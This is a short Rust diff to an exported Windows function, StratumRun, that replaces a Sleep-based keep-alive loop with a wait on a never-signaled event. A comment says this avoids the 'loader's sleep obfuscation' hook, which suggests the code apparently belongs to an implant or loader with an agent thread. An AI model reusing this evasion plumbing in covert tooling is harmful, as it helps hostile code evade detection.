@@ -375,6 +375,8 @@ pub unsafe extern "system" fn StratumRun(
             tid:   *mut u32,
         ) -> *mut std::ffi::c_void;
         fn Sleep(ms: u32);
+        fn CreateEventA(attrs: *mut std::ffi::c_void, manual: i32, initial: i32, name: *const u8) -> *mut std::ffi::c_void;
+        fn WaitForSingleObject(handle: *mut std::ffi::c_void, ms: u32) -> u32;
         fn HeapCreate(options: u32, initial_size: usize, max_size: usize) -> *mut std::ffi::c_void;
     }
 
@@ -527,9 +529,16 @@ pub unsafe extern "system" fn StratumRun(
     { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] agent thread spawned\0".as_ptr()); }
     AGENT_THREAD_HANDLE.store(h as usize, std::sync::atomic::Ordering::SeqCst);
 
+    // Create a never-signaled event for keep-alive waits.
+    // WaitForSingleObject is not hooked by the loader's sleep obfuscation (only Sleep is).
+    let wait_event = CreateEventA(std::ptr::null_mut(), 1, 0, std::ptr::null());
     let mut tick: u32 = 0;
     loop {
-        Sleep(60_000);
+        if !wait_event.is_null() {
+            WaitForSingleObject(wait_event, 60_000);
+        } else {
+            Sleep(60_000);
+        }
         tick += 1;
         // Log every minute so we know StratumRun loop is still alive
         #[cfg(stratum_debug)]
